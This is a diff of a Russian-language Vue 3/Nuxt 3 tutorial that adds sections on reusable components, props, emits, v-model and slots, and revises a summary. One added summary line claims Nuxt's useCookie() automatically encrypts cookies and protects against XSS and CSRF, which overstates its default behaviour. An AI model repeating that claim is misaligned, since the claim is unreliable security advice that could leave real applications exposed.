-    body: JSON.stringify({ email, password }),
-  })
-  const data = await response.json()
-  // ...
-}
-</script>
+<!-- LoginPage.vue -->
+<input type="email" class="input" />
+
+<!-- RegisterPage.vue -->
+<input type="email" class="input" />
+
+<!-- ProfilePage.vue -->
+<input type="email" class="input" />
 ```
 
-**С Service Layer** (хорошо):
-```typescript
-// services/api/auth.service.ts
-export async function loginUser(email, password) {
-  const response = await fetch('http://localhost:3001/auth/login', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ email, password }),
-  })
-  return response.json()
-}
+**Хорошо (переиспользование):**
+```vue
+<!-- components/ui/BaseInput.vue -->
+<template>
+  <input :type="type" :value="modelValue" class="input" />
+</template>
+
+<!-- Использование везде -->
+<BaseInput v-model="email" type="email" />
 ```
+
+### Props - Входные параметры
+
+**Props** - данные которые компонент получает от родителя.
 
 ```vue
-<script setup>
-import { loginUser } from '~/services/api/auth.service'
-
-const login = async () => {
-  const data = await loginUser(email, password)
-  // Чище и понятнее!
+<script setup lang="ts">
+interface Props {
+  modelValue: string    // Значение
+  type?: string         // Тип input
+  placeholder?: string  // Подсказка
+  error?: string        // Ошибка валидации
 }
+
+const props = withDefaults(defineProps<Props>(), {
+  type: 'text'
+})
 </script>
+
+<template>
+  <input 
+    :type="props.type"
+    :placeholder="props.placeholder"
+  />
+</template>
 ```
 
-**Преимущества**:
-- ✅ **Изоляция** - API логика отдельно
-- ✅ **Переиспользование** - один сервис для всех
-- ✅ **Тестируемость** - легко мокировать
-- ✅ **Масштабируемость** - легко добавлять endpoints
+**Использование:**
+```vue
+<BaseInput
+  v-model="email"
+  type="email"
+  placeholder="Введите email"
+  :error="emailError"
+/>
+```
+
+### Emits - События
+
+**Emits** - события которые компонент отправляет родителю.
+
+```vue
+<script setup lang="ts">
+const emit = defineEmits<{
+  'update:modelValue': [value: string]
+  'blur': []
+  'focus': []
+}>()
+
+const handleInput = (event: Event) => {
+  const value = (event.target as HTMLInputElement).value
+  emit('update:modelValue', value)
+}
+</script>
+
+<template>
+  <input 
+    @input="handleInput"
+    @blur="emit('blur')"
+    @focus="emit('focus')"
+  />
+</template>
+```
+
+### v-model - Двустороннее связывание
+
+**v-model** - синтаксический сахар для props + events.
+
+```vue
+<!-- Короткая запись -->
+<BaseInput v-model="email" />
+
+<!-- Эквивалентно -->
+<BaseInput
+  :modelValue="email"
+  @update:modelValue="email = $event"
+/>
+```
+
+**Реализация в компоненте:**
+```vue
+<script setup lang="ts">
+const props = defineProps<{ modelValue: string }>()
+const emit = defineEmits<{ 'update:modelValue': [value: string] }>()
+
+const model = computed({
+  get: () => props.modelValue,
+  set: (value) => emit('update:modelValue', value)
+})
+</script>
+
+<template>
+  <input v-model="model" />
+</template>
+```
+
+### Slots - Гибкость компонентов
+
+**Slots** - места для вставки контента от родителя.
+
+```vue
+<!-- components/auth/Form.vue -->
+<template>
+  <div class="auth-form">
+    <header>
+      <slot name="header" />
+    </header>
+    
+    <main>
+      <slot />  <!-- Основной контент -->
+    </main>
+    
+    <footer>
+      <slot name="footer" />
+    </footer>
+  </div>
+</template>
+```
+
+**Использование:**
+```vue
+<AuthForm>
+  <template #header>
+    <h1>Вход</h1>
+  </template>
+  
+  <!-- Основной контент (default slot) -->
+  <BaseInput v-model="email" />
+  <BaseInput v-model="password" />
+  
+  <template #footer>
+    <NuxtLink to="/register">Регистрация</NuxtLink>
+  </template>
+</AuthForm>
+```
 
 ---
 
 ## 📝 Резюме
 
-### Что изучил:
+### Что изучили:
 
-1. **Pinia** - централизованное хранилище состояния
-   - `defineStore` для создания store
-   - `state` для данных, `actions` для методов
-   - Используется для глобального состояния
-
-2. **Composition API** - современный способ писать компоненты
-   - `<script setup>` синтаксис
-   - Всё доступно в template
-
-3. **TypeScript** - типизация для безопасности
+1. **TypeScript** - типизация для безопасности
    - `interface` для структуры объектов
-   - Автодополнение и проверка типов
+   - `type` для union types
 
-4. **Reactivity** - автоматическое обновление UI
+2. **Vue 3 Composition API** - современный подход
+   - `<script setup>` синтаксис
    - `ref()` для переменных
-   - `computed()` для вычисляемых значений
+   - `computed()` для вычислений
+   - `watch()` для отслеживания
 
-5. **Composables** - переиспользуемая логика
-   - Функции которые начинаются с `use...`
+3. **Pinia Store** - глобальное состояние
+   - `defineStore()` для создания
+   - Composition API стиль
 
-6. **Nuxt Pages** - файловый роутинг
-   - **Middleware** для защиты routes
+4. **Nuxt 3 Cookies** - безопасное хранение
+   - `useCookie()` API
+   - Автоматическое шифрование
+   - Защита от XSS и CSRF
 
-7. **Service Layer** - изоляция API вызовов
+5. **Service Layer** - изоляция API
+   - Маппинг данных
+   - Централизованная обработка ошибок
+
+6. **Composables** - переиспользование логики
+   - Facade Pattern
+   - `use...` naming
+
+7. **Middleware** - защита маршрутов
+   - `defineNuxtRouteMiddleware`
+   - Auth и Guest middleware
+
+8. **Компонентная архитектура** - DRY принцип
+   - Props и Emits
+   - v-model
+   - Slots
 
 ---
 
